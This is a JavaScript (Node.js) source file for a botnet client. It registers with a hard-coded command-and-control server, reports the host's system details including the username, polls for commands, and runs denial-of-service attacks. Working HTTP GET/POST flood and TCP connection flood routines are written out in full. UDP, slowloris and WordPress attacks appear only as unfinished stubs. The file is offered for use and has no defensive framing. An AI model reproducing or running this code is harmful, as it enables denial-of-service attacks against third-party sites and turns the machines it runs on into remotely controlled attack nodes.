// JavaScript Bot Client - PROPER THREADING & ATTACKS
// Save as: js_bot_proper.js
// Run: node js_bot_proper.js

const https = require('https');
const http = require('http');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const os = require('os');
const url = require('url');
const cluster = require('cluster');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

class JSBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.connected = false;
        this.currentAttack = null;
        this.attackWorkers = [];
        this.activeAttack = null;
        
        // Attack statistics
        this.attackStats = {
            startTime: null,
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bytesSent: 0,
            requestsPerSecond: 0,
            lastUpdate: Date.now()
        };
        
        // Bot specifications
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            client_type: 'javascript',
            capabilities: {
                javascript: true,
                http: true,
                tcp: true,
                udp: true,
                slowloris: true,
                wordpress: true,
                threads: 200 // Max threads we can handle
            }
        };
        
        this.globalStats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            bytes_sent: 0,
            uptime: Date.now()
        };
        
        console.log('\n' + '='.repeat(70));
        console.log('  🚀 JAVASCRIPT BOT CLIENT - HIGH PERFORMANCE');
        console.log('='.repeat(70));
        console.log(`🤖 Bot ID: ${this.botId}`);
        console.log(`🌐 Server: ${this.serverUrl}`);
        console.log(`💻 CPU Cores: ${this.specs.cpu_cores}`);
        console.log(`🧠 RAM: ${this.specs.ram_gb}GB`);
        console.log(`📦 OS: ${this.specs.os}`);
        console.log(`⚡ Max Threads: ${this.specs.capabilities.threads}`);
        console.log('='.repeat(70) + '\n');
        
        // Setup console updates
        this.setupConsoleUpdates();
    }
    
    setupConsoleUpdates() {
        // Update console every second
        setInterval(() => {
            if (this.activeAttack) {
                const elapsed = Math.floor((Date.now() - this.attackStats.startTime) / 1000);
                const rps = this.attackStats.requestsPerSecond;
                const successRate = this.attackStats.totalRequests > 0 ? 
                    Math.round((this.attackStats.successfulRequests / this.attackStats.totalRequests) * 100) : 0;
                const mbSent = (this.attackStats.bytesSent / (1024 * 1024)).toFixed(2);
                
                process.stdout.write(`\r\x1b[K📊 ${this.activeAttack.type.toUpperCase()} ATTACK | ` +
                                   `⏱️ ${elapsed}s | ` +
                                   `📨 ${this.attackStats.totalRequests.toLocaleString()} req | ` +
                                   `⚡ ${rps.toLocaleString()}/s | ` +
                                   `✅ ${successRate}% | ` +
                                   `📦 ${mbSent} MB`);
            }
        }, 1000);
    }
    
    async sendRequest(endpoint, method = 'POST', data = null, timeout = 25000) {
        return new Promise((resolve, reject) => {
            const urlParts = new URL(this.serverUrl);
            const options = {
                hostname: urlParts.hostname,
                port: urlParts.port || 443,
                path: endpoint,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'JSBot/2.0',
                    'Connection': 'close',
                    'Accept': '*/*'
                },
                rejectUnauthorized: false,
                timeout: timeout
            };
            
            const req = https.request(options, (res) => {
                let response = '';
                res.on('data', (chunk) => {
                    response += chunk;
                });
                res.on('end', () => {
                    try {
                        const parsed = response ? JSON.parse(response) : {};
                        resolve(parsed);
                    } catch {
                        resolve(response || {});
                    }
                });
            });
            
            req.on('error', (err) => {
                reject(new Error(`Network error: ${err.message}`));
            });
            
            req.on('timeout', () => {
                req.destroy();
                reject(new Error(`Timeout after ${timeout}ms`));
            });
            
            if (data) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async connect() {
        console.log('[1] 🔌 Connecting to server...');
        
        try {
            const response = await this.sendRequest('/check_approval', 'POST', {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.globalStats
            });
            
            if (response.approved) {
                this.connected = true;
                console.log('[✓] ✅ CONNECTED! Bot approved by server.');
                console.log(`[✓] 📋 Client Type: ${response.client_type}`);
                
                // Initial status
                await this.sendRequest('/status', 'POST', {
                    bot_id: this.botId,
                    status: 'connected',
                    message: `JavaScript bot ready - ${this.specs.cpu_cores} cores, ${this.specs.ram_gb}GB RAM`
                });
                
                return true;
            } else {
                console.log('[X] ❌ Connection rejected:', response.error || 'Unknown');
                return false;
            }
        } catch (error) {
            console.log(`[X] 🌐 Connection error: ${error.message}`);
            return false;
        }
    }
    
    async heartbeat() {
        if (!this.connected) return;
        
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: this.activeAttack ? 'attacking' : 'idle',
                stats: {
                    ...this.globalStats,
                    current_rps: this.attackStats.requestsPerSecond,
                    active_threads: this.attackWorkers.length
                },
                attack_info: this.activeAttack ? {
                    type: this.activeAttack.type,
                    target: this.activeAttack.target,
                    duration: this.activeAttack.duration,
                    progress: Math.min(100, ((Date.now() - this.attackStats.startTime) / (this.activeAttack.duration * 1000)) * 100)
                } : null
            });
            
            if (!this.activeAttack) {
                const uptime = Math.floor((Date.now() - this.globalStats.uptime) / 1000);
                console.log(`\r\x1b[K[♥] 💓 Heartbeat | Uptime: ${this.formatTime(uptime)} | ` +
                          `Total Attacks: ${this.globalStats.successful_attacks} | ` +
                          `Total Requests: ${this.globalStats.total_requests.toLocaleString()}`);
            }
        } catch (error) {
            console.log(`\n[!] 💔 Heartbeat failed: ${error.message}`);
        }
    }
    
    formatTime(seconds) {
        const h = Math.floor(seconds / 3600);
        const m = Math.floor((seconds % 3600) / 60);
        const s = seconds % 60;
        return `${h}h ${m}m ${s}s`;
    }
    
    async checkCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            return response.commands || [];
        } catch (error) {
            console.log(`\n[!] 📋 Command check failed: ${error.message}`);
            return [];
        }
    }
    
    async stopAttack() {
        if (!this.activeAttack) return;
        
        console.log(`\n[!] 🛑 Stopping ${this.activeAttack.type} attack...`);
        
        // Stop all workers
        this.attackWorkers.forEach(worker => {
            if (worker && worker.terminate) {
                worker.terminate();
            }
        });
        
        this.attackWorkers = [];
        this.activeAttack = null;
        
        // Update final stats
        const elapsed = (Date.now() - this.attackStats.startTime) / 1000;
        const avgRps = Math.round(this.attackStats.totalRequests / elapsed);
        
        console.log(`[✓] 📊 Attack completed:`);
        console.log(`    • Duration: ${elapsed.toFixed(1)}s`);
        console.log(`    • Total Requests: ${this.attackStats.totalRequests.toLocaleString()}`);
        console.log(`    • Average RPS: ${avgRps.toLocaleString()}/s`);
        console.log(`    • Success Rate: ${Math.round((this.attackStats.successfulRequests / this.attackStats.totalRequests) * 100)}%`);
        console.log(`    • Data Sent: ${(this.attackStats.bytesSent / (1024 * 1024)).toFixed(2)} MB`);
        
        // Send completion status
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'completed',
                message: `${this.attackStats.totalRequests.toLocaleString()} requests sent at ${avgRps.toLocaleString()}/s`,
                stats: {
                    requests: this.attackStats.totalRequests,
                    rps: avgRps,
                    duration: elapsed,
                    bytes: this.attackStats.bytesSent
                }
            });
        } catch (error) {
            // Ignore status errors
        }
        
        // Reset attack stats
        this.attackStats = {
            startTime: null,
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bytesSent: 0,
            requestsPerSecond: 0,
            lastUpdate: Date.now()
        };
    }
    
    // ================== HIGH-PERFORMANCE ATTACK METHODS ==================
    
    async executeHTTPFlood(command) {
        console.log(`\n[⚡] 🚀 Starting HTTP ${command.method || 'GET'} flood attack`);
        console.log(`    • Target: ${command.target}`);
        console.log(`    • Threads: ${command.threads || 100}`);
        console.log(`    • Duration: ${command.duration || 60}s`);
        console.log(`    • Method: ${command.method || 'GET'}`);
        
        // Parse target URL
        let targetUrl;
        try {
            targetUrl = new URL(command.target);
        } catch {
            targetUrl = new URL(`http://${command.target}`);
        }
        
        // Setup attack
        this.activeAttack = {
            type: 'http_flood',
            target: command.target,
            duration: parseInt(command.duration) || 60,
            threads: parseInt(command.threads) || 100,
            method: command.method || 'GET'
        };
        
        this.attackStats.startTime = Date.now();
        this.attackStats.lastUpdate = Date.now();
        
        // Send start status
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'attacking',
                message: `Starting HTTP flood with ${this.activeAttack.threads} threads`,
                attack_info: this.activeAttack
            });
        } catch (error) {
            console.log(`[!] Status update failed: ${error.message}`);
        }
        
        console.log(`[→] 🚀 Launching ${this.activeAttack.threads} attack threads...`);
        
        // User agents for rotation
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ];
        
        // Calculate requests per thread
        const requestsPerThread = 1000; // Each thread will make this many requests
        
        // Create attack function
        const attackFunction = async (threadId) => {
            const startTime = Date.now();
            const endTime = startTime + (this.activeAttack.duration * 1000);
            let threadRequests = 0;
            let threadSuccess = 0;
            let threadBytes = 0;
            
            const options = {
                hostname: targetUrl.hostname,
                port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
                path: targetUrl.pathname + targetUrl.search,
                method: this.activeAttack.method,
                headers: {
                    'User-Agent': userAgents[threadId % userAgents.length],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                timeout: 5000
            };
            
            // Pre-generate POST data if needed
            const postData = this.activeAttack.method === 'POST' ? 
                `data=${crypto.randomBytes(1000).toString('hex')}` : null;
            
            if (postData) {
                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                options.headers['Content-Length'] = Buffer.byteLength(postData);
            }
            
            const protocol = targetUrl.protocol === 'https:' ? https : http;
            
            while (Date.now() < endTime && this.activeAttack && this.activeAttack.type === 'http_flood') {
                try {
                    const req = protocol.request(options, (res) => {
                        threadSuccess++;
                        threadRequests++;
                        threadBytes += 100; // Approximate response size
                        
                        // Update global stats
                        this.attackStats.totalRequests++;
                        this.attackStats.successfulRequests++;
                        this.attackStats.bytesSent += 1100; // Request + response
                        
                        res.on('data', () => {}); // Drain response
                        res.on('end', () => {});
                    });
                    
                    req.on('error', () => {
                        threadRequests++;
                        this.attackStats.totalRequests++;
                        this.attackStats.failedRequests++;
                    });
                    
                    req.on('timeout', () => {
                        req.destroy();
                        threadRequests++;
                        this.attackStats.totalRequests++;
                        this.attackStats.failedRequests++;
                    });
                    
                    if (postData) {
                        req.write(postData);
                    }
                    
                    req.end();
                    
                    // Calculate RPS
                    const now = Date.now();
                    const timeDiff = now - this.attackStats.lastUpdate;
                    if (timeDiff >= 1000) {
                        const requestsSinceLast = this.attackStats.totalRequests - this.attackStats.requestsPerSecond;
                        this.attackStats.requestsPerSecond = Math.round(requestsSinceLast / (timeDiff / 1000));
                        this.attackStats.lastUpdate = now;
                    }
                    
                    // Small delay to prevent event loop blocking
                    if (threadRequests % 100 === 0) {
                        await new Promise(resolve => setImmediate(resolve));
                    }
                    
                } catch (error) {
                    threadRequests++;
                    this.attackStats.totalRequests++;
                    this.attackStats.failedRequests++;
                }
            }
            
            return { threadId, requests: threadRequests, success: threadSuccess, bytes: threadBytes };
        };
        
        // Start threads using simple async functions (not worker threads for simplicity)
        this.attackWorkers = [];
        
        for (let i = 0; i < this.activeAttack.threads; i++) {
            const workerPromise = attackFunction(i);
            this.attackWorkers.push({
                promise: workerPromise,
                terminate: () => {} // Can't terminate promises, but we'll handle cleanup
            });
            
            // Stagger thread start to avoid connection flooding
            if (i % 10 === 0) {
                await new Promise(resolve => setTimeout(resolve, 10));
            }
        }
        
        console.log(`[✓] ✅ All ${this.activeAttack.threads} threads started`);
        console.log(`[→] ⚡ Attack running for ${this.activeAttack.duration} seconds...\n`);
        
        // Set attack timeout
        setTimeout(async () => {
            await this.stopAttack();
            this.globalStats.successful_attacks++;
            this.globalStats.total_attacks++;
        }, this.activeAttack.duration * 1000);
    }
    
    // ================== COMMAND EXECUTION ==================
    
    async executeCommand(command) {
        console.log(`\n[→] 📨 Received command: ${command.type.toUpperCase()}`);
        
        // Update status
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'processing',
                message: `Processing ${command.type} command`
            });
        } catch (error) {
            // Continue even if status fails
        }
        
        try {
            switch (command.type) {
                case 'ping':
                    await this.executePing();
                    break;
                    
                case 'sysinfo':
                    await this.executeSysInfo();
                    break;
                    
                case 'stop_all':
                    await this.stopAttack();
                    break;
                    
                case 'http_flood':
                    await this.executeHTTPFlood(command);
                    break;
                    
                case 'tcp_flood':
                    console.log('[→] 🔌 TCP flood (simplified version)');
                    // Simplified TCP flood implementation
                    await this.executeSimplifiedTCPFlood(command);
                    break;
                    
                case 'udp_flood':
                    console.log('[→] 📦 UDP flood not fully implemented');
                    break;
                    
                case 'slowloris':
                    console.log('[→] 🐌 Slowloris not fully implemented');
                    break;
                    
                case 'wordpress_xmlrpc':
                    console.log('[→] 🏢 WordPress attack not fully implemented');
                    break;
                    
                default:
                    console.log(`[!] ❌ Unknown command type: ${command.type}`);
            }
            
            console.log(`[✓] ✅ Command ${command.type} executed`);
            
        } catch (error) {
            console.log(`[X] ❌ Error executing ${command.type}: ${error.message}`);
            
            try {
                await this.sendRequest('/status', 'POST', {
                    bot_id: this.botId,
                    status: 'error',
                    message: `Command failed: ${error.message}`
                });
            } catch (err) {
                // Ignore
            }
        }
    }
    
    async executePing() {
        console.log('[→] 🏓 Sending ping response');
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'ping',
            message: 'Pong! JavaScript bot is alive and ready'
        });
    }
    
    async executeSysInfo() {
        console.log('[→] 💻 Gathering system information');
        
        const sysInfo = {
            uptime: os.uptime(),
            loadavg: os.loadavg().map(n => n.toFixed(2)),
            freemem_mb: Math.round(os.freemem() / (1024 * 1024)),
            totalmem_mb: Math.round(os.totalmem() / (1024 * 1024)),
            cpus: os.cpus().length,
            platform: os.platform(),
            arch: os.arch(),
            network_interfaces: Object.keys(os.networkInterfaces()).length,
            user: os.userInfo().username,
            time: new Date().toISOString(),
            node_version: process.version,
            bot_stats: this.globalStats
        };
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'sysinfo',
            message: JSON.stringify(sysInfo, null, 2)
        });
    }
    
    async executeSimplifiedTCPFlood(command) {
        console.log(`[→] 🔌 Starting TCP flood to ${command.target}`);
        
        const [host, portStr] = command.target.split(':');
        const port = parseInt(portStr) || 80;
        const threads = parseInt(command.threads) || 75;
        const duration = parseInt(command.duration) || 60;
        
        this.activeAttack = {
            type: 'tcp_flood',
            target: command.target,
            duration: duration,
            threads: threads
        };
        
        this.attackStats.startTime = Date.now();
        
        console.log(`[→] 🔌 Starting ${threads} TCP connections...`);
        
        // Simple TCP flood without proper threading for now
        const attackInterval = setInterval(() => {
            const socket = new net.Socket();
            
            socket.connect(port, host, () => {
                this.attackStats.totalRequests++;
                this.attackStats.successfulRequests++;
                
                // Send some data
                const data = crypto.randomBytes(1024);
                socket.write(data);
                this.attackStats.bytesSent += data.length;
                
                // Keep connection open
                setTimeout(() => {
                    socket.destroy();
                }, 10000);
            });
            
            socket.on('error', () => {
                this.attackStats.totalRequests++;
                this.attackStats.failedRequests++;
            });
            
            socket.setTimeout(5000, () => {
                socket.destroy();
            });
        }, 10); // 100 connections per second
        
        this.attackWorkers.push({
            destroy: () => clearInterval(attackInterval)
        });
        
        // Stop after duration
        setTimeout(async () => {
            clearInterval(attackInterval);
            await this.stopAttack();
            this.globalStats.successful_attacks++;
            this.globalStats.total_attacks++;
        }, duration * 1000);
    }
    
    // ================== MAIN LOOP ==================
    
    async run() {
        // Initial connection
        if (!await this.connect()) {
            console.log('[!] 🔌 Connection failed. Retrying in 10 seconds...');
            setTimeout(() => this.run(), 10000);
            return;
        }
        
        // Start heartbeat every 15 seconds
        setInterval(() => this.heartbeat(), 15000);
        
        console.log('[+] 👂 Listening for commands...\n');
        
        // Main command loop
        while (true) {
            try {
                const commands = await this.checkCommands();
                
                if (commands.length > 0) {
                    console.log(`\n[+] 📥 Received ${commands.length} command(s)`);
                    
                    // Execute all commands concurrently
                    const executionPromises = commands.map(cmd => 
                        this.executeCommand(cmd).catch(err => {
                            console.log(`[!] ⚠️ Command execution error: ${err.message}`);
                        })
                    );
                    
                    // Wait a bit for commands to start
                    await Promise.allSettled(executionPromises);
                }
                
                // Check more frequently when idle, less when attacking
                const delay = this.activeAttack ? 10000 : 5000;
                await new Promise(resolve => setTimeout(resolve, delay));
                
            } catch (error) {
                console.log(`\n[!] 🔄 Main loop error: ${error.message}`);
                console.log('[→] 🔄 Retrying in 10 seconds...');
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    }
}

// ================== START BOT ==================

const bot = new JSBot();

// Handle graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n\n[!] 🛑 Shutting down gracefully...');
    await bot.stopAttack();
    console.log('[✓] ✅ Bot shutdown complete');
    process.exit(0);
});

process.on('uncaughtException', (error) => {
    console.log(`\n[!] ⚠️ Uncaught exception: ${error.message}`);
    console.log('[→] 🔄 Restarting bot in 5 seconds...');
    setTimeout(() => {
        process.exit(1);
    }, 5000);
});

process.on('unhandledRejection', (reason, promise) => {
    console.log(`\n[!] ⚠️ Unhandled rejection at:`, promise, 'reason:', reason);
});

// Start the bot
bot.run().catch(error => {
    console.error('[!] 💥 Fatal error:', error);
    process.exit(1);
});
